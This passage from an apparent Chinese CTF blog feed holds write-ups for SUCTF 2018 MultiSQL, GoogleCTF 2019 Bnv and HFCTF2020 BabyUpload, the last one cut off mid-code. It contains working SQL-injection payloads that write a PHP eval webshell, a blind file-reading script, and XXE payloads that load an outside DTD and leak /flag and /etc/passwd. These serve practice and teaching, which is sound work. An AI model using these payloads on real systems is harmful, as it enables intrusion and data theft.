class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成key为147.922415852</p><p>用flask-session-cookie-manager构造下session，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[SUCTF 2018]MultiSQL</title>
      <link href="/p/3887377890.html"/>
      <url>/p/3887377890.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[sql读文件|outfile|load_file]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821131531758.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>注册个账号，发现?id=2</p><p>试了下异或，可行</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821132717828.png"></p><p>尝试了很久，过滤了很多东西，substr被过滤了，不过mid还可以。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821133645237.png"></p><p>数据库用户suctf@localhost</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>测试了下select 123，没反应，还以为不能堆叠注入。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">'select 123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//73656C65637420313233</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656C65637420313233</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> test <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>结果wp一看，得，直接写shell。还是得敢于尝试。</p><ul><li><p>secure_file_priv</p><blockquote><p>null =&gt; 不允许导入/导出</p><p>/tmp/ =&gt; 导入/导出只能发生在/tmp/目录下</p><p>没有具体值 =&gt; 不做限制</p></blockquote></li></ul><p>先查下这个函数为/var/www/，所以是可以直接写入shell的。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821155311899.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">"select '&lt;?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> test <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还可以用char()函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"select '&lt;?php eval($_POST[_]);?>' into outfile '/var/www/html/favicon/shell.php';"</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">'char('</span><span class="token operator">+</span><span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">')'</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还可以读文件</p><p>这里将文件内容16进制编码，这样一个字符最多比较32次，大大提高效率。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>char <span class="token operator">=</span> <span class="token string">'0123456789ABCDEF'</span>filename <span class="token operator">=</span> <span class="token string">'/var/www/html/bwvs_config/waf.php'</span>c <span class="token operator">=</span> <span class="token string">''</span>url <span class="token operator">=</span> <span class="token string">'http://7336265a-aec9-4b2d-a5b7-fcf4a830e92a.node4.buuoj.cn:81/user/user.php?id=2-if(hex(load_file(0x%s))like(0x%s),1,0)'</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> char<span class="token punctuation">:</span>        payload <span class="token operator">=</span> c <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'%'</span>        _url <span class="token operator">=</span> url <span class="token operator">%</span> <span class="token punctuation">(</span>to_hex<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span> to_hex<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            _url<span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'bg10pda2o4dav113b5s373lg72'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'admin'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'......'</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>            c <span class="token operator">=</span> c <span class="token operator">+</span> i        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目名是MultiSQL，试试二次注入</p><p>注册用户名为<code>1&#39;and 0</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821135214740.png"></p><p>写个代码，方便看回显</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">import</span> randomsession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>username <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\\\'select 1"</span>burp0_url <span class="token operator">=</span> <span class="token string">"http://8d71418c-654d-4f38-8b8f-9c8ff4a0a2fc.node4.buuoj.cn:81/user/regCheck.php"</span>burp0_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"New_pass"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Re_pass"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"\xe6\xb3\xa8\xe5\x86\x8c"</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token comment"># /html/body/div/div[3]/div[1]/div</span>html <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>name <span class="token operator">=</span> html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div/div[3]/div[1]/div//text()'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'你好，\t'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>单引号双引号会加反斜杠，过滤的字符会变成@@</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821141202344.png"></p><p>还是老规矩，fuzz一下吧</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821144946867.png"></p><p>不过这意义也不大，毕竟flag不在数据库里。就这样吧。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GoogleCTF2019 Quals]Bnv</title>
      <link href="/p/1267717976.html"/>
      <url>/p/1267717976.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820171713352.png"></p><p>xxe题，做的很少。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212013565.png"></p><p>某个师傅曾言</p><blockquote><p>有json的地方就可能有xxe</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212256827.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212310901.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212332230.png"></p><p>这样提示需要声明元素message</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820214800081.png"></p><p>声明下实体</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message (#PCDATA)&gt;    &lt;!ENTITY b &quot;123401012350240234&quot;&gt;]&gt;&lt;message&gt;&amp;b;&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820214714839.png"></p><p>请求成功。</p><p>接下来利用<a href="https://beeceptor.com/">https://beeceptor.com/</a></p><p>这个网站可以创建个临时域名并保存对该域名的请求日志</p><p>尝试加载外部实体</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"123401012350240234"</span><span class="token punctuation">></span></span>    &lt;!ENTITY % remote-dtd SYSTEM "https://asdfasd.free.beeceptor.com/">    %remote-dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可惜加载失败</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820215223474.png"></p><p>尝试加载内部文件</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"123401012350240234"</span><span class="token punctuation">></span></span>    &lt;!ENTITY % remote-dtd SYSTEM "/etc/passwd">    %remote-dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820215437263.png"></p><blockquote><p>error detected in Markup declaration</p><p>在标记声明中检测到错误。</p></blockquote><p>说明已经被加载了，但不是个格式正确的xml文件所以中断了。</p><p>加载/flag，报错一致，说明/flag文件存在，接下来就是考虑如何读取。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221036776.png"></p><blockquote><p>It works because all XML entities are constant. If you define two entities with the same name, only the first one will be used.</p><p>这能正常工作是因为xml实体都是常数，如果定义了两个实体为同一个名字，则只有第一个实体会被使用。</p></blockquote><p>而在题目中，读取了一个错误的实体，会返回完整的实体名。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221415864.png"></p><p>假设第一次读取**/flag<strong>实体，第二次把</strong>/flag的里的值<strong>当做实体来读取，明显</strong>/flag的里的值**这个实体不存在，然后就会报错返回，这样就拿到flag了。</p><p>利用系统自带的dtd文件。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221838853.png"></p><p>payload</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">    &lt;!ENTITY % ISOamso '    &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///flag">    &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///aaaaa/<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">    <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;    <span class="token entity" title="&#x25;">&amp;#x25;</span>error;'>%local_dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="奇文共赏"><a href="#奇文共赏" class="headerlink" title="奇文共赏"></a>奇文共赏</h3><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Exploiting XXE with local DTD files</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[HFCTF2020]BabyUpload</title>
      <link href="/p/2499911821.html"/>
      <url>/p/2499911821.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[file_exists|postman|文件上传|session]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/babyctf/success.txt'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">safe_delete</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$direction</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'direction'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'attr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir_path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/babyctf/"</span> <span class="token operator">.</span> <span class="token variable">$attr</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$attr</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"private"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$dir_path</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"_"</span> <span class="token operator">.</span> <span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sha256"</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span 